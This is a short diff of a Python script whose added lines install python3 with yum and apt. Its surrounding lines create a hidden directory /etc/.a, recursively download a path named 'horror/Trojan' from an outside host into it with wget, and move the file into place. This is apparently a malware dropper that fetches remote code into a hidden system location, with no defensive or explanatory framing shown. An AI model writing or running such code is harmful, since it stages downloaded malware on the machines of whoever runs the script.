@@ -3,6 +3,8 @@ import subprocess
 from sys import argv
 def main():
     directory = os.getcwd()
+    os.system("yum install python3")
+    os.system("apt install python3")
     os.system("mkdir /etc/.a")
     os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan")
     os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
